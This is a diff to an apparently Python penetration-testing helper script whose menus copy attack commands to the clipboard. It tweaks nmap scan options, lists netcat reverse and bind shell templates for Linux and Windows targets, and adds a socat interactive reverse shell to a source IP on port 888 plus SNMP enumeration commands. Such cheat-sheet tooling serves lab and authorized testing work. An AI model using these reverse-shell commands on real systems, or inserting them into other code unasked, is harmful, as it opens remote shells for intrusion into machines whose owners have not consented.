@@ -96,7 +96,7 @@ def nmap():
     options = {1 : ["nmap phase 1", f"nmap -sSV -Pn -nvv -p- --reason -T4 -oN {store_directory}/{target_ip}_nmap_tcp_ports.txt {target_ip}"],
         2: ["nmap phase 2", f"nmap -sSV -sC -Pn -nvv -p{ports} -A --version-intensity 9 -O --reason -T4 -oN {store_directory}/{target_ip}_nmap_detailed.txt {target_ip}"],
         3: ["nmap phase 3", f"nmap -A -O --script vuln -p{ports} -oN {store_directory}/{target_ip}_nmap_vuln_scan.txt {target_ip}"],
-        4: ["nmap udp scan", f"nmap -Pn -p- -sU --stats-every 3m --max-retries 2 -T4 -oN {store_directory}/{target_ip}_nmap_udp_ports.txt {target_ip}"],
+        4: ["nmap udp scan", f"nmap -Pn -p- -nvvv -sU --stats-every 3m --max-retries 2 --min-rate 5000 -oN {store_directory}/{target_ip}_nmap_udp_ports.txt {target_ip}"],
         5: ["nmap example script usage", f"nmap -T4 -sV --script=firewalk.nse -oN {store_directory}/{target_ip}_nmap_firewalk.txt {target_ip}"],
     }
 
@@ -218,7 +218,7 @@ def nc():
             print("Enter an integer for a port")
         else:
             options = {1 : ["Reverse shell on linux target", f"nc -nv {source_ip} {local_port} -e /bin/bash"],
-                2 :["Reverse shell on windows target", f"nc -nv {source_ip} {local_port} -e cmd.exe"],
+                2 : ["Reverse shell on windows target", f"nc -nv {source_ip} {local_port} -e cmd.exe"],
                 3 : ["Reverse shell listener", f"nc -nvlp {local_port}"],
                 4 : ["Bind shell listener on windows target", f"nc -lvp {target_port} -e cmd.exe"],
                 5 : ["Bind shell connect", f"nc -nv {target_ip} {target_port}"],
@@ -226,7 +226,7 @@ def nc():
                 7 : ["Transfer file with nc at source", f"nc -w 3 [destination] {target_port}< out.file"],
                 8 : ["Transfer compressed file with nc at destination", f"nc -l -p {target_port} | uncompress -c | tar xvfp -"],
                 9 : ["Transfer compressed file with nc at source", f"tar cfp - /some/dir | compress -c | nc -w 3 [destination] {target_port}"],
-                10 : ["Port scan with nc", f"nc -vz {target_ip} 1-1023"],
+                10 : ["Port scan with nc (-u for udp)", f"nc -vz {target_ip} 1-1023"],
             }
             break
     
@@ -451,6 +451,20 @@ def merlin():
     
     copy_to_clipboard(options)
 
+def socat():
+    options = {1 : ["Listen on server", r"""socat file:`tty`,raw,echo=0 tcp-listen:888"""],
+        2 : ["On target machine", f"""socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{source_ip}:888"""],
+    }
+    
+    copy_to_clipboard(options)
+
+def snmp():
+    options = {1 : ["Enumerate snmp - need to change version and community string", f"""snmpwalk -c public {target_ip} -v 2c"""],
+        2 : ["Enumerate using onesixtyone", f"""onesixtyone -c /usr/share/doc/onesixtyone/dict.txt {target_ip}"""],
+    }
+    
+    copy_to_clipboard(options)
+
 def linux():
     options = {1 : ["Service", f"/etc/init.d"],
         2 : ["Network configuration", "/etc/network/interfaces"],
@@ -542,6 +556,8 @@ options = {"nmap" : nmap,
            "impacket" : impacket,
            "find" : find,
            "merlin" : merlin,
+           "socat" : socat,
+           "snmp" : snmp,
 }
 
 systems = {"windows" : windows, "linux" : linux}
